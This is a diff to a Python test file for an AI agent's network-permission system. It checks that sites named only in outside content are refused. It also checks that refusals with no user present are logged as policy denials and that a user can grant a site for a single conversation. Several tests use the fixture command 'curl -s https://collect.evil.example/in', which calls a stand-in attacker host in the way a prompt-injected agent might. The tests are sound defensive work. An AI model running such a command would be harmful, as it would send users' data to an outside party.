@@ -234,9 +234,27 @@ async def test_a_no_on_that_card_stores_nothing_and_nobody_to_ask_shows_none(exe
     assert len(asker.frames) == 1 and result["network_note"].startswith("The user said no to:")
     _, alone = await _after_outside_content(monkeypatch, "curl -s https://collect.evil.example/in",
                                             executor=_Exec(REFUSED))
-    assert "network_note" not in alone and "net_refused" not in alone
+    # Codex round 1, F7: with nobody to ask the model is told what a card is told there (it is listed: below)
+    assert "net_refused" not in alone and "this run has nobody to ask" in alone["network_note"]
     async with execution_db() as db:
         assert await permission_store.find_grant(db, "c1", None, "network", "network:collect.evil.example") is None
+
+
+async def test_with_nobody_to_ask_a_refused_site_is_listed_as_its_card_and_nothing_is_granted(execution_db,
+                                                                                             monkeypatch):
+    """Codex round 1, F7: the card goes where every card goes with nobody to ask (`permissions.decide_many`): refused by
+    policy, and its ledger row is what the Inbox lists (tests/server/test_net_a_inbox.py). Nothing is granted."""
+    refused = {**REFUSED, "net_refused": ["collect.evil.example", "drop.evil.example"]}
+    _, result = await _after_outside_content(monkeypatch, "curl -s https://collect.evil.example/in",
+                                             executor=_Exec(refused))
+    async with execution_db() as db:
+        rows = [r for r in await permission_store.recent(db) if r.kind == "network"]
+        grants = await permission_store.list_conversation_grants(db, "network")
+    assert [(r.decided_by, r.decision, r.conversation_id) for r in rows] == [("policy", "deny", "c1")]
+    assert rows[0].target == "network:collect.evil.example\x1enetwork:drop.evil.example"       # one card, both sites
+    assert "curl -s https://collect.evil.example/in" in rows[0].detail and "drop.evil.example" in rows[0].detail
+    assert permission_store.could_not_ask(rows[0]) and grants == []
+    assert "net_refused" not in result and "this run has nobody to ask" in result["network_note"]
 
 
 def test_the_cards_request_is_this_conversation_only_and_its_grant_is_live():
@@ -245,6 +263,66 @@ def test_the_cards_request_is_this_conversation_only_and_its_grant_is_live():
     assert "network" in permissions._NEVER_ALWAYS
     assert permissions.grant_is_live("network", "network:collect.evil.example")
     assert permissions.grant_is_live("network", "network:*") and not permissions.grant_is_live("network", "network:")
+
+
+# ── verify's run: the same refusal and the same card (Codex round 1, F8) ──────
+
+def _verified(refused: list[str]) -> dict:
+    """What verify reports after a smoke test whose run the proxy refused `refused` in: terminal_exec's own reading of
+    the run (`explain`), through verify's own result (`project_verify._result`)."""
+    from pathlib import Path
+    from server.services import project_verify
+    out = terminal_exec.explain({"ok": False, "exit_code": 2, "stdout": "", "stderr": REFUSED["stderr"],
+                                 "cwd": "/private/tmp/proj", "sandbox": "workspace", "error": "exit code 2"},
+                                cwd=Path("/private/tmp/proj"), closed=[], mode="workspace", timed_out=False,
+                                command="make test", net_refused=tuple(refused))
+    return project_verify._result(project_verify.Plan("make", "make test", "Makefile target test"), out, True)
+
+
+class _Verify:
+    """Stand-in verify executor: what verify reports after that run."""
+    key, timeout_s = "verify", 30
+
+    def __init__(self, result):
+        self.result = result
+
+    async def execute(self, args):
+        return dict(self.result)
+
+
+async def _verify_after_outside_content(monkeypatch, result, *, asker=None) -> dict:
+    async def resolve():
+        return [{"key": "verify", "description": "verify"}]
+    monkeypatch.setitem(tool_loop.EXECUTORS, "verify", _Verify(result))
+    with _read_a_page(), permissions.asking_with(asker):
+        return await tool_loop._run_tool("verify", {"folder": "proj", "network": True}, "{}", ToolTurn(
+            resolve_tools=resolve, emit=lambda e: None, tool_timeout_s=5, tool_trace=[], convo=[],
+            confirm_command=_Cards(True), conversation_id="c1"))
+
+
+async def test_a_site_refused_in_verifys_run_asks_the_same_card_and_gets_the_same_grant(execution_db, monkeypatch):
+    asker = _Asker()
+    result = await _verify_after_outside_content(monkeypatch, _verified(["collect.evil.example"]), asker=asker)
+    [frame] = asker.frames
+    assert (frame["perm_kind"], frame["target"], frame["options"]) == ("network", "network:collect.evil.example",
+                                                                       ["conversation"])
+    assert "`make test` tried to connect to collect.evil.example" in frame["detail"]      # verify's own command
+    assert "net_refused" not in result
+    assert result["network_note"].startswith("collect.evil.example was refused: it appeared only in outside content")
+    assert result["network_note"].endswith("The user allowed collect.evil.example for this conversation: run the "
+                                           "command again.")
+    async with execution_db() as db:
+        grant = await permission_store.find_grant(db, "c1", None, "network", "network:collect.evil.example")
+    assert grant is not None and grant.task_id == ""
+
+
+async def test_a_site_refused_in_verifys_run_with_nobody_to_ask_is_listed_as_after_a_command(execution_db,
+                                                                                             monkeypatch):
+    result = await _verify_after_outside_content(monkeypatch, _verified(["collect.evil.example"]))
+    async with execution_db() as db:
+        rows = [r for r in await permission_store.recent(db) if r.kind == "network"]
+    assert [(r.decided_by, r.target) for r in rows] == [("policy", "network:collect.evil.example")]
+    assert "net_refused" not in result and "this run has nobody to ask" in result["network_note"]
 
 
 # ── recording what outside content names ─────────────────────────────────────
